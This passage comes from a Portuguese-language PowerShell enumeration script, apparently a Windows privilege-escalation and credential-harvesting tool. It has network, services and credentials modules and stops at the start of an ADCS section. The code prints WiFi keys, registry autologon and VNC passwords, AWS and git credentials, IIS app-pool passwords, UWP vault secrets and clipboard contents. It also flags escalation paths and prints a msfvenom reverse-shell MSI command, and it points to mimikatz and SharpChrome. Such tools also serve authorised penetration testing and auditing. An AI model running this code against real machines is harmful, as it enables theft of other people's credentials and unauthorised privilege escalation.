        Get-NetIPAddress -ErrorAction Stop | Where-Object { $_.AddressFamily -eq "IPv4" } |
        ForEach-Object {
            W-Info "$($_.InterfaceAlias.PadRight(25)) $($_.IPAddress.PadRight(18)) /$($_.PrefixLength)"
        }
    } catch {
        ipconfig /all 2>&1 | ForEach-Object { W-Data $_ }
    }

    W-Sub "Rotas"
    try {
        Get-NetRoute -ErrorAction Stop | Where-Object { $_.DestinationPrefix -ne "0.0.0.0/0" -and $_.DestinationPrefix -notmatch "::" } |
        Select-Object -First 20 | ForEach-Object {
            W-Data "$($_.DestinationPrefix.PadRight(22)) via $($_.NextHop.PadRight(18)) [if $($_.InterfaceIndex)]"
        }
    } catch { route print 2>&1 | Select-Object -First 30 | ForEach-Object { W-Data $_ } }

    W-Sub "Portas em escuta (LISTENING)"
    try {
        $conns = netstat -ano | Where-Object { $_ -match "LISTENING" }
        $conns | ForEach-Object {
            $parts = $_ -split '\s+' | Where-Object { $_ -ne "" }
            if ($parts.Count -ge 5) {
                $localAddr = $parts[1]
                $pid       = $parts[4]
                $procName  = try { (Get-Process -Id $pid -ErrorAction Stop).ProcessName } catch { "N/A" }
                # Portas internas (127.0.0.1) com nome de processo
                $highlight = $localAddr -match "127\.0\.0\.1"
                if ($highlight) { W-Med "LOCAL  $($localAddr.PadRight(25)) PID $($pid.PadLeft(6))  $procName" }
                else             { W-Data "       $($localAddr.PadRight(25)) PID $($pid.PadLeft(6))  $procName" }
            }
        }
    } catch { netstat -ano | ForEach-Object { W-Data $_ } }

    W-Sub "Conexoes estabelecidas"
    try {
        netstat -ano | Where-Object { $_ -match "ESTABLISHED" } | Select-Object -First 20 |
        ForEach-Object { W-Data $_ }
    } catch {}

    W-Sub "Hosts file"
    try {
        $hostsLines = Get-Content "C:\Windows\System32\drivers\etc\hosts" | Where-Object { $_ -notmatch "^#" -and $_ -match "\S" }
        $hostsLines | ForEach-Object { W-Data $_ }
        $suspicious = $hostsLines | Where-Object { $_ -match "google|microsoft|windows|defender|update" }
        if ($suspicious) {
            W-High "Entradas suspeitas no hosts file (possivel malware/AV bypass):"
            $suspicious | ForEach-Object { W-Data $_ }
        }
    } catch { W-Info "Erro hosts file: $_" }

    W-Sub "DNS Cache"
    try {
        $dns = Get-DnsClientCache -ErrorAction Stop | Select-Object -First 30
        $dns | ForEach-Object { W-Data "$($_.Entry) -> $($_.Data)" }
    } catch { ipconfig /displaydns 2>&1 | Select-Object -First 40 | ForEach-Object { W-Data $_ } }

    W-Sub "Compartilhamentos (Shares)"
    try {
        Get-SmbShare -ErrorAction Stop | ForEach-Object {
            W-Info "Share: $($_.Name.PadRight(20)) Path: $($_.Path)"
            if ($_.Path -and (Find-WritablePath $_.Path)) {
                W-High "  -> Share com pasta gravavel: $($_.Path)"
            }
        }
    } catch { net share 2>&1 | ForEach-Object { W-Data $_ } }

    W-Sub "Regras de firewall desabilitadas ou permissivas"
    try {
        $rules = Get-NetFirewallRule -ErrorAction Stop | Where-Object {
            $_.Enabled -eq "True" -and $_.Action -eq "Allow" -and $_.Direction -eq "Inbound"
        }
        $broad = $rules | Where-Object { $_.LocalPort -match "Any|0" -or $_.RemoteAddress -match "Any" }
        if ($broad) {
            W-Med "$($broad.Count) regra(s) de firewall permissiva(s) (Allow Inbound Any):"
            $broad | Select-Object -First 10 | ForEach-Object { W-Data "$($_.DisplayName)" }
        } else {
            W-Ok "Sem regras de firewall excessivamente permissivas detectadas"
        }
    } catch { W-Info "Erro firewall: $_" }

    W-Sub "Adaptadores wireless — perfis salvos (senhas)"
    try {
        $profiles = netsh wlan show profiles 2>&1 | Where-Object { $_ -match "All User Profile" }
        foreach ($line in $profiles) {
            $name = ($line -split ":", 2)[1].Trim()
            $key  = netsh wlan show profile name="$name" key=clear 2>&1 | Where-Object { $_ -match "Key Content" }
            if ($key) {
                W-High "WiFi '$name' senha: $(($key -split ":", 2)[1].Trim())"
            }
        }
    } catch { W-Info "Sem perfis WiFi ou netsh indisponivel" }
}

# ─── MODULO: SERVICOS ────────────────────────────────────────────────────────

function Invoke-ServicesChecks {
    W-Sec "SERVICOS, TASKS E BINARIOS"

    W-Sub "Servicos — Unquoted Service Path"
    try {
        $found = $false
        Get-CimInstance Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
            $p = $_.PathName
            if ($p -notmatch '^"' -and $p -match ' ' -and $p -match '\.exe' -and $p -notmatch 'system32|SysWOW64') {
                W-High "Unquoted: '$($_.Name)' (State: $($_.State)) -> $p"
                # Verificar se algum componente intermediario e gravavel
                # Extrair apenas o path do executavel, sem argumentos de linha de comando
                $cleanPath = if ($p -match '\.exe') { ($p -split '(?i)\.exe')[0] + '.exe' } else { ($p -split ' ')[0] }
                $parts = $cleanPath.Split('\') ; $cur = ""
                foreach ($part in $parts) {
                    $cur += $part
                    if ($cur -match ' ' -and (Test-Path $cur) -and (Find-WritablePath $cur)) {
                        W-Crit "  -> Componente gravavel: $cur"
                    }
                    $cur += "\"
                }
                $found = $true
            }
        }
        if (-not $found) { W-Ok "Nenhum Unquoted Service Path fora do System32" }
    } catch { W-Info "Erro unquoted: $_" }

    W-Sub "Servicos — binario gravavel"
    try {
        $found = $false
        Get-CimInstance Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
            $raw  = $_.PathName -replace '"',''
            $exe  = ($raw -split ' ')[0]
            if ((Test-Path $exe) -and $exe -notmatch 'system32|SysWOW64|WinSxS') {
                if (Find-WritablePath $exe) {
                    $sev = if ($_.StartMode -eq "Auto" -and $_.State -eq "Running") { "CRIT" } else { "HIGH" }
                    if ($sev -eq "CRIT") { W-Crit "Servico com binario gravavel: '$($_.Name)' -> $exe" }
                    else                 { W-High  "Servico com binario gravavel: '$($_.Name)' -> $exe" }
                    $found = $true
                }
            }
        }
        if (-not $found) { W-Ok "Nenhum servico com binario gravavel" }
    } catch { W-Info "Erro binarios: $_" }

    W-Sub "Servicos — permissao fraca na SCM (sc sdshow)"
    try {
        $found = $false
        Get-CimInstance Win32_Service | Select-Object -First 50 | ForEach-Object {
            $svc  = $_
            $sddl = sc.exe sdshow $svc.Name 2>&1
            # RP = Start, WP = Stop, SW = Enumerate — permissoes para todos
            if ($sddl -match "\(A;;[A-Z]*RP[A-Z]*WP[A-Z]*;;;(WD|BU|IU|AU|LW|S-1-1-0|S-1-5-11|S-1-5-32-545)\)") {
                W-High "Servico '$($svc.Name)' com SDDL permissivo para users comuns"
                $found = $true
            }
        }
        if (-not $found) { W-Ok "Nenhuma permissao SCM perigosa detectada (amostra 50)" }
    } catch { W-Info "Erro SCM SDDL: $_" }

    W-Sub "Servicos com paths UNC"
    try {
        Get-CimInstance Win32_Service | Where-Object { $_.PathName -match "^\\\\" } |
        ForEach-Object { W-High "Servico com path UNC: '$($_.Name)' -> $($_.PathName)" }
    } catch {}

    W-Sub "Scheduled Tasks — binarios graváveis e autores suspeitos"
    try {
        $found = $false
        Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | ForEach-Object {
            $task = $_
            $task.Actions | Where-Object { $_.CimClass -and $_.CimClass.CimClassName -eq "MSFT_TaskExecAction" } | ForEach-Object {
                $exe = ($_.Execute -replace '"','').Trim()
                if ($exe -and (Test-Path $exe) -and $exe -notmatch 'system32|SysWOW64') {
                    if (Find-WritablePath $exe) {
                        $lvl = $task.Principal.RunLevel
                        $sev = if ($lvl -eq "Highest") { "CRIT" } else { "HIGH" }
                        $msg = "Task '$($task.TaskName)' binario gravavel: $exe (RunLevel: $lvl)"
                        if ($sev -eq "CRIT") { W-Crit $msg } else { W-High $msg }
                        $found = $true
                    }
                }
            }
        }
        if (-not $found) { W-Ok "Nenhuma Scheduled Task com binario gravavel" }
    } catch { W-Info "Erro tasks: $_" }

    W-Sub "DLL Search Order Hijacking — diretorios graváveis no PATH"
    try {
        $pathDirs = $env:PATH -split ";"
        foreach ($dir in $pathDirs) {
            if ($dir -and (Test-Path $dir) -and (Find-WritablePath $dir)) {
                W-High "Diretorio PATH gravavel (DLL hijacking): $dir"
            }
        }
    } catch { W-Info "Erro PATH DLL: $_" }

    W-Sub "AlwaysInstallElevated"
    try { $hklm = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated } catch { $hklm = 0 }
    try { $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated } catch { $hkcu = 0 }
    if ($hklm -eq 1 -and $hkcu -eq 1) {
        W-Crit "AlwaysInstallElevated ATIVO — qualquer MSI roda como SYSTEM!"
        W-Data "msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > s.msi && msiexec /quiet /i s.msi"
    } elseif ($hklm -eq 1 -or $hkcu -eq 1) {
        W-Med "AlwaysInstallElevated parcial (HKLM=$hklm HKCU=$hkcu) — ambos precisam ser 1 para explorar"
    } else { W-Ok "AlwaysInstallElevated nao configurado" }

    W-Sub "MSI Transforms — pasta de cache gravavel"
    if (Find-WritablePath "C:\Windows\Installer") {
        W-High "C:\Windows\Installer gravavel — possivel MSI transform injection"
    }

    W-Sub "Print Nightmare — Spooler e permissoes"
    try {
        $spooler = Get-Service -Name Spooler -ErrorAction Stop
        if ($spooler.Status -eq "Running") {
            W-Med "Spooler ativo"
            if (Find-WritablePath "C:\Windows\System32\spool\drivers") {
                W-Crit "Print Nightmare: pasta de drivers gravavel! CVE-2021-1675 / CVE-2021-34527"
            }
        } else { W-Ok "Spooler desativado" }
    } catch { W-Ok "Spooler: servico nao encontrado ou inacessivel" }

    W-Sub "Servicos — permissao de reconfigurar (sc config)"
    try {
        $found = $false
        Get-CimInstance Win32_Service | Where-Object { $_.State -eq "Running" -and $_.StartMode -eq "Auto" } |
        Select-Object -First 30 | ForEach-Object {
            $sddl = sc.exe sdshow $_.Name 2>&1
            # CC = ChangeConfig, DC = Delete — perigoso para users comuns
            if ($sddl -match "\(A;;[A-Z]*CC[A-Z]*;;;(WD|BU|IU|AU|S-1-1-0|S-1-5-11|S-1-5-32-545)\)") {
                W-Crit "Servico '$($_.Name)' — user comum pode reconfigurar (sc config) = privesc"
                $found = $true
            }
        }
        if (-not $found) { W-Ok "Nenhum servico Auto+Running reconfiguravel por user comum" }
    } catch { W-Info "Erro sc config check: $_" }

    W-Sub "LOLBAS — binarios OS em caminhos graváveis"
    $lolbas = @("mshta.exe","wscript.exe","cscript.exe","rundll32.exe","regsvr32.exe",
                 "certutil.exe","bitsadmin.exe","msiexec.exe","installutil.exe",
                 "regasm.exe","regsvcs.exe","msbuild.exe","cmstp.exe","ieexec.exe")
    $found = $false
    foreach ($bin in $lolbas) {
        $paths = @("C:\Windows\System32\$bin","C:\Windows\SysWOW64\$bin") | Where-Object { Test-Path $_ }
        foreach ($p in $paths) {
            if (Find-WritablePath $p) {
                W-Crit "LOLBAS gravavel: $p — substituir para RCE sem AV"
                $found = $true
            }
        }
    }
    if (-not $found) { W-Ok "LOLBAS: sem binarios graváveis em System32/SysWOW64" }

    W-Sub "Registry AutoRun HKCU — graváveis por usuario atual"
    $hkcuRuns = @(
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    )
    foreach ($k in $hkcuRuns) {
        try {
            $vals = Get-ItemProperty $k -ErrorAction Stop
            $vals.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
                $v = $_.Value
                $exe = if ($v -match '"') { ($v -split '"')[1] } else { ($v -split ' ')[0] }
                W-High "HKCU AutoRun (gravavel por user): $($_.Name) -> $v"
                if ($exe -and (Test-Path $exe) -and (Find-WritablePath $exe)) {
                    W-Crit "  -> Binario do AutoRun gravavel: $exe"
                }
            }
        } catch {}
    }

    W-Sub "Compartilhamentos — acesso anonimo e Everyone"
    try {
        $shares = Get-CimInstance Win32_Share | Where-Object { $_.Name -notmatch 'ADMIN\$|IPC\$|C\$|[A-Z]\$' }
        foreach ($sh in $shares) {
            W-Info "Share: $($sh.Name) -> $($sh.Path)"
            try {
                $sd  = Get-CimInstance Win32_LogicalShareSecuritySetting -Filter "Name='$($sh.Name)'" -ErrorAction Stop
                $sec = $sd.GetSecurityDescriptor().Descriptor.DACL
                $sec | ForEach-Object {
                    if ($_.Trustee.Name -match "Everyone|Todos|Authenticated Users|NETWORK" -and $_.AccessMask -ge 1179817) {
                        W-High "Share '$($sh.Name)' acessivel por '$($_.Trustee.Name)' (mask=$($_.AccessMask))"
                    }
                    if ($_.Trustee.SIDString -eq "S-1-1-0" -or $_.Trustee.SIDString -eq "S-1-5-7") {
                        W-Crit "Share '$($sh.Name)' aberto para Everyone/Anonymous!"
                    }
                }
            } catch {}
        }
    } catch { W-Info "Erro shares: $_" }

    W-Sub "PowerShell JEA Endpoints"
    try {
        $eps = Get-PSSessionConfiguration -ErrorAction Stop | Where-Object { $_.Name -ne "microsoft.powershell" -and $_.Name -ne "microsoft.powershell32" }
        if ($eps) {
            foreach ($ep in $eps) {
                W-Med "JEA Endpoint: '$($ep.Name)' | RunAs: $($ep.RunAsUser) | SDDL: $($ep.SecurityDescriptorSddl)"
                if ($ep.SecurityDescriptorSddl -match "S-1-1-0|WD|BU") {
                    W-High "JEA '$($ep.Name)' acessivel por todos — verificar allowlist de comandos"
                }
            }
        } else { W-Ok "Nenhum JEA endpoint customizado" }
    } catch { W-Info "JEA: $_ (requer admin)" }

    W-Sub "Bitlocker — volumes sem criptografia"
    try {
        $vols = Get-CimInstance -Namespace "root\cimv2\security\MicrosoftVolumeEncryption" `
                                -ClassName Win32_EncryptableVolume -ErrorAction Stop
        foreach ($v in $vols) {
            # ProtectionStatus: 0=Off 1=On 2=Unknown
            if ($v.ProtectionStatus -eq 0) {
                W-High "Bitlocker OFF em $($v.DriveLetter) — acesso offline ao SAM/NTDS possivel"
            } else {
                W-Ok "Bitlocker ativo em $($v.DriveLetter)"
            }
        }
    } catch { W-Info "Bitlocker: nao disponivel ou requer admin" }

    W-Sub "Windows Error Reporting — dumps de processos"
    try {
        $werDir = "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive"
        if (Test-Path $werDir) {
            $dumps = Get-ChildItem $werDir -Recurse -Filter "*.dmp" -ErrorAction SilentlyContinue
            if ($dumps.Count -gt 0) {
                W-High "WER: $($dumps.Count) dump(s) em $werDir — podem conter credenciais/tokens"
                $dumps | Select-Object -First 5 | ForEach-Object { W-Data $_.FullName }
            }
        }
        $wldpDir = "C:\Windows\System32\WerFault.exe"
        if (Test-Path $wldpDir) {
            $reg = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -ErrorAction SilentlyContinue)
            if ($reg -and $reg.DontShowUI -eq 1) { W-Med "WER silencioso ativo (DontShowUI=1)" }
        }
    } catch {}

    W-Sub "Scheduled Tasks — credenciais RunAs expostas"
    try {
        $found = $false
        schtasks /query /fo CSV /v 2>&1 | ConvertFrom-Csv -ErrorAction SilentlyContinue |
        Where-Object { $_."Run As User" -and $_."Run As User" -notmatch "SYSTEM|NETWORK SERVICE|LOCAL SERVICE|N/A" } |
        Select-Object -First 20 | ForEach-Object {
            W-Med "Task '$($_."Task To Run")' roda como '$($_."Run As User")'"
            $found = $true
        }
        if (-not $found) { W-Ok "Nenhuma task com RunAs usuario customizado" }
    } catch {}
}

# ─── MODULO: CREDENCIAIS ────────────────────────────────────────────────────

function Invoke-CredsChecks {
    W-Sec "CREDENCIAIS & SECRETS"

    W-Sub "PowerShell History — todos os perfis"
    Get-UserProfiles | ForEach-Object {
        $hist = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if (Test-Path $hist) {
            $lines = Get-Content $hist
            $hits  = $lines | Where-Object { $_ -match "password|passwd|pwd|secret|token|key|credential|iex|downloadstring|webclient|bypass|encode|net use|runas" }
            if ($hits) {
                W-High "PS History hits em $($_.Name):"
                $hits | Select-Object -First 8 | ForEach-Object { W-Data $_ }
            } else { W-Ok "$($_.Name): $($lines.Count) linhas, sem hits" }
        }
    }

    W-Sub "Windows Credential Manager"
    try {
        cmdkey /list 2>&1 | Where-Object { $_ -match "Target|User|Type" -and $_ -notmatch "Currently" } |
        ForEach-Object { W-High $_ }
    } catch {}

    W-Sub "Credenciais salvas — DPAPI Vault"
    try {
        $vaults = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Vault" -Directory
        $vaults | ForEach-Object {
            W-High "Vault encontrado: $($_.FullName) — use mimikatz vault::list"
        }
    } catch {}

    W-Sub "DPAPI masterkeys (outros perfis)"
    Get-UserProfiles | ForEach-Object {
        $dp = "$($_.FullName)\AppData\Roaming\Microsoft\Protect"
        if (Test-Path $dp) {
            $keys = @(Get-ChildItem $dp -Recurse -ErrorAction SilentlyContinue)
            if ($keys.Count -gt 0) {
                W-Med "$($keys.Count) masterkey(s) em $($_.Name) — use SharpDPAPI ou mimikatz dpapi::masterkey"
            }
        }
    }

    W-Sub "SAM / SYSTEM / SECURITY — acessibilidade direta"
    @("C:\Windows\System32\config\SAM","C:\Windows\System32\config\SYSTEM","C:\Windows\System32\config\SECURITY",
      "C:\Windows\repair\SAM","C:\Windows\repair\system") | ForEach-Object {
        if (Test-Path $_) {
            W-High "Arquivo sensivel acessivel: $_"
        }
    }

    W-Sub "Unattend / Sysprep — senhas em texto claro"
    @("C:\unattend.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattended.xml",
      "C:\Windows\system32\sysprep\sysprep.xml","C:\Windows\system32\sysprep.inf",
      "C:\Windows\system32\sysprep\Panther\unattend.xml") | ForEach-Object {
        if (Test-Path $_) {
            W-Crit "Unattend/Sysprep encontrado: $_"
            $content = Get-Content $_ -ErrorAction SilentlyContinue
            $content | Where-Object { $_ -match "Password|UserPassword|AdministratorPassword|AutoLogon" } |
            ForEach-Object { W-Data $_ }
        }
    }

    W-Sub "Registro — senhas em texto claro"
    $regCreds = @(
        @{ Key="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"; Values=@("DefaultPassword","AltDefaultPassword","DefaultUserName") },
        @{ Key="HKCU:\SOFTWARE\ORL\WinVNC3\Password";       Values=@("Password") },
        @{ Key="HKLM:\SOFTWARE\RealVNC\WinVNC4";            Values=@("Password") },
        @{ Key="HKLM:\SOFTWARE\TightVNC\Server";            Values=@("Password","PasswordViewOnly") },
        @{ Key="HKCU:\Software\SimonTatham\PuTTY\Sessions"; Values=@() }
    )
    foreach ($rc in $regCreds) {
        try {
            $item = Get-ItemProperty $rc.Key -ErrorAction Stop
            if ($rc.Values.Count -eq 0) {
                # PuTTY sessions
                Get-ChildItem $rc.Key -ErrorAction SilentlyContinue | ForEach-Object {
                    $sess = Get-ItemProperty $_.PSPath
                    if ($sess.HostName) {
                        W-High "PuTTY session: $($sess.HostName):$($sess.PortNumber) user=$($sess.UserName)"
                    }
                }
            } else {
                foreach ($v in $rc.Values) {
                    $val = $item.$v
                    if ($val) { W-Crit "Registro [$($rc.Key)] $v = $val" }
                }
            }
        } catch {}
    }

    W-Sub "SNMP Community Strings"
    try {
        $snmp = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" -ErrorAction Stop
        $snmp.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } |
        ForEach-Object { W-High "SNMP Community: $($_.Name) = $($_.Value)" }
    } catch {}

    W-Sub "Browsers — bases de credenciais"
    @(
        @{ N="Chrome";  P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" },
        @{ N="Edge";    P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" },
        @{ N="Brave";   P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" },
        @{ N="Opera";   P="$env:APPDATA\Opera Software\Opera Stable\Login Data" }
    ) | ForEach-Object {
        if (Test-Path $_.P) {
            $sz = [math]::Round((Get-Item $_.P).Length/1KB,1)
            W-High "$($_.N) Login Data: $($_.P) ($sz KB) — use SharpChrome/HackBrowserData"
        }
    }
    Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory | ForEach-Object {
        $lj = "$($_.FullName)\logins.json"
        if (Test-Path $lj) {
            try { $cnt = (Get-Content $lj | ConvertFrom-Json).logins.Count; W-High "Firefox: $cnt creds — $lj" }
            catch { W-Med "Firefox logins.json: $lj" }
        }
    }

    W-Sub "Cloud CLI — AWS / Azure / GCP"
    @(
        @{ P="$env:USERPROFILE\.aws\credentials";                              L="AWS credentials";  Sev="CRIT" },
        @{ P="$env:USERPROFILE\.azure\accessTokens.json";                      L="Azure tokens";     Sev="CRIT" },
        @{ P="$env:USERPROFILE\.azure\azureProfile.json";                      L="Azure profile";    Sev="HIGH" },
        @{ P="$env:APPDATA\gcloud\application_default_credentials.json";       L="GCP credentials";  Sev="CRIT" }
    ) | ForEach-Object {
        if (Test-Path $_.P) {
            if ($_.Sev -eq "CRIT") { W-Crit "$($_.L): $($_.P)" } else { W-High "$($_.L): $($_.P)" }
            if ($_.P -match "aws.credentials") {
                Get-Content $_.P | Where-Object { $_ -notmatch "^#" -and $_ -match "=" } |
                ForEach-Object { W-Data $_ }
            }
        }
    }
    Get-UserProfiles | ForEach-Object {
        $a = "$($_.FullName)\.aws\credentials"
        if (Test-Path $a) { W-Crit "AWS credentials (outro usuario): $a" }
    }

    W-Sub "Git — tokens e credential store"
    Get-UserProfiles | ForEach-Object {
        $userName = $_.Name
        $gc = "$($_.FullName)\.gitconfig"
        if (Test-Path $gc) {
            Get-Content $gc | Where-Object { $_ -match "token|password|url.*@|helper" } |
            ForEach-Object { W-High "Git config ($userName): $_" }
        }
        $gs = "$($_.FullName)\.git-credentials"
        if (Test-Path $gs) {
            W-Crit "Git credential store: $gs"
            Get-Content $gs | ForEach-Object { W-Data $_ }
        }
    }

    W-Sub "Chaves SSH privadas"
    Get-ChildItem "C:\Users\*\.ssh","C:\ProgramData\ssh" -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match "^id_|\.pem$|\.ppk$" -and $_.Name -notmatch "\.pub$" } |
        ForEach-Object { W-High "Chave SSH: $($_.FullName)" }

    W-Sub "IIS web.config — connection strings"
    Get-ChildItem "C:\inetpub" -Recurse -Filter "web.config" | ForEach-Object {
        $filePath = $_.FullName
        try {
            [xml]$xml = Get-Content $filePath
            $xml.configuration.connectionStrings.add | Where-Object { $_.connectionString -match "password|pwd|uid=" } |
            ForEach-Object { W-Crit "web.config DB cred ($filePath): $($_.connectionString)" }
            $xml.configuration.appSettings.add | Where-Object { $_.key -match "pass|secret|token|key|api" -and $_.value } |
            ForEach-Object { W-High "web.config appSetting ($filePath): $($_.key) = $($_.value)" }
        } catch {}
    }

    W-Sub "Arquivos com senhas (Desktop + Documents)"
    @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents") | ForEach-Object {
        Get-ChildItem $_ -Recurse -Include "*.txt","*.xml","*.ini","*.cfg","*.conf","*.ps1","*.bat" | ForEach-Object {
            try {
                $hits = Get-Content $_.FullName -TotalCount 200 |
                        Where-Object { $_ -match "password\s*=|passwd\s*=|secret\s*=|token\s*=|api.key\s*=" }
                if ($hits) {
                    W-High "Arquivo com creds: $($_.FullName)"
                    $hits | Select-Object -First 4 | ForEach-Object { W-Data $_ }
                }
            } catch {}
        }
    }

    W-Sub "WiFi — senhas em texto claro"
    try {
        netsh wlan show profiles 2>&1 | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $n   = ($_ -split ":", 2)[1].Trim()
            $key = netsh wlan show profile name="$n" key=clear 2>&1 | Where-Object { $_ -match "Key Content" }
            if ($key) { W-High "WiFi '$n': $(($key -split ':', 2)[1].Trim())" }
        }
    } catch {}

    W-Sub "Kerberos tickets (klist)"
    try {
        $klist = klist 2>&1
        if ($klist -notmatch "No credentials|error") {
            $tickets = $klist | Where-Object { $_ -match "#\d|Server:|KerbTicket|Ticket Flags" }
            if ($tickets) {
                W-Info "Kerberos tickets ativos:"
                $tickets | ForEach-Object { W-Data $_ }
            }
        } else { W-Ok "Sem tickets Kerberos" }
        # Delegation tickets (unconstrained)
        if ($klist -match "forwardable") { W-High "Ticket FORWARDABLE detectado — possivel pass-the-ticket" }
    } catch { W-Info "klist nao disponivel: $_" }

    W-Sub "Clipboard — conteudo atual"
    try {
        $clip = Get-Clipboard -ErrorAction Stop
        if ($clip) {
            $charCount = ($clip -join "`n").Length
            W-Med "Clipboard tem conteudo ($charCount chars):"
            $clip | Select-Object -First 5 | ForEach-Object { W-Data $_ }
        } else { W-Ok "Clipboard vazio" }
    } catch { W-Info "Erro clipboard: $_" }

    W-Sub "UWP Credential Locker (PasswordVault)"
    try {
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $creds = $vault.RetrieveAll()
        if ($creds.Count -gt 0) {
            W-High "UWP PasswordVault: $($creds.Count) credencial(is):"
            $creds | ForEach-Object {
                $_.RetrievePassword()
                W-Data "Resource: $($_.Resource) | User: $($_.UserName) | Pass: $($_.Password)"
            }
        } else { W-Ok "UWP PasswordVault vazio" }
    } catch { W-Info "Erro PasswordVault: $_" }

    W-Sub "McAfee SiteList.xml (credenciais cifradas)"
    $sitelistPaths = @(
        "C:\Program Files (x86)\McAfee\Common Framework\SiteList.xml",
        "C:\Program Files\McAfee\Common Framework\SiteList.xml",
        "C:\Users\*\AppData\Roaming\McAfee\Common Framework\SiteList.xml"
    )
    Get-ChildItem $sitelistPaths -ErrorAction SilentlyContinue | ForEach-Object {
        W-Crit "McAfee SiteList.xml: $($_.FullName)"
        try {
            [xml]$sl = Get-Content $_.FullName
            $sl.SiteLists.SiteList.HTTPSiteSecurity | Where-Object { $_.Enabled -eq "1" } | ForEach-Object {
                W-Data "Server: $($_.Server) | User: $($_.UserName) | Pass(enc): $($_.Password)"
            }
        } catch {}
        W-Data "Decriptar: python3 mcafee_sitelist_pwd_decrypt.py <hash>"
    }

    W-Sub "IIS AppCmd — App Pool credentials"
    $appcmdPaths = @("C:\Windows\System32\inetsrv\appcmd.exe","C:\inetpub\appcmd.exe")
    foreach ($ap in $appcmdPaths) {
        if (Test-Path $ap) {
            try {
                $pools = & $ap list apppool /processModel.userName:* /text:processModel.userName 2>&1
                $pools | Where-Object { $_ -match "\S" } | ForEach-Object {
                    $user = $_
                    $pass = & $ap list apppool /processModel.userName:$user /text:processModel.password 2>&1
                    W-Crit "IIS AppPool: $user / $pass"
                }
            } catch {}
        }
    }

    W-Sub "Arquivos .reg com senhas"
    try {
        Get-ChildItem "C:\Users\$env:USERNAME" -Recurse -Include "*.reg" -ErrorAction SilentlyContinue |
        Select-Object -First 20 | ForEach-Object {
            $hits = Get-Content $_.FullName -ErrorAction SilentlyContinue |
                    Where-Object { $_ -match "password|passwd|pwd|secret" }
            if ($hits) {
                W-High "Arquivo .reg com credenciais: $($_.FullName)"
                $hits | Select-Object -First 3 | ForEach-Object { W-Data $_ }
            }
        }
    } catch {}

    W-Sub "Remote Desktop (RDP) — credenciais salvas"
    try {
        $rdpCreds = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction Stop
        $rdpCreds | ForEach-Object {
            $server = $_.PSChildName
            $user   = (Get-ItemProperty $_.PSPath).UsernameHint
            W-High "RDP credencial salva: $server (user: $user)"
        }
        $rdpDefault = (Get-ItemProperty "HKCU:\Software\Microsoft\Terminal Server Client\Default" -ErrorAction SilentlyContinue).MRU0
        if ($rdpDefault) { W-Info "Ultimo servidor RDP: $rdpDefault" }
    } catch { W-Ok "Sem credenciais RDP salvas" }

    W-Sub "Permissoes de escrita em chaves de registro sensiveis"
    $sensitiveKeys = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    )
    foreach ($key in $sensitiveKeys) {
        try {
            $acl = Get-Acl $key -ErrorAction Stop
            foreach ($rule in $acl.Access) {
                if ($rule.IdentityReference -match "Users|Everyone|Authenticated|$env:USERNAME" -and
                    $rule.RegistryRights     -match "FullControl|SetValue|CreateSubKey|WriteKey") {
                    W-High "Registro gravavel: $key | $($rule.IdentityReference) -> $($rule.RegistryRights)"
                }
            }
        } catch {}
    }

    W-Sub "LAPS — DLL instalada"
    $lapsDll = @(
        "C:\Program Files\LAPS\CSE\AdmPwd.dll",
        "C:\Program Files (x86)\LAPS\CSE\AdmPwd.dll",
        "$env:SystemRoot\System32\AdmPwd.dll"
    )
    $lapsFound = $false
    foreach ($dll in $lapsDll) {
        if (Test-Path $dll) {
            $ver = (Get-Item $dll).VersionInfo.FileVersion
            W-Ok "LAPS instalado: $dll (v$ver)"
            $lapsFound = $true
        }
    }
    if (-not $lapsFound) { W-Med "LAPS (AdmPwd.dll) nao encontrado — LAPS pode nao estar deployado" }
}

# ─── MODULO: ADCS ────────────────────────────────────────────────────────────

function Invoke-ADCSChecks {
    W-Sec "ADCS — Active Directory Certificate Services (ESC1-ESC17)"

    if (-not (Test-Domain)) { W-Info "Nao esta em dominio — ADCS ignorado"; return }

    W-Sub "CAs no dominio"
    try {
        $configNC    = ([ADSI]"LDAP://RootDSE").configurationNamingContext[0]
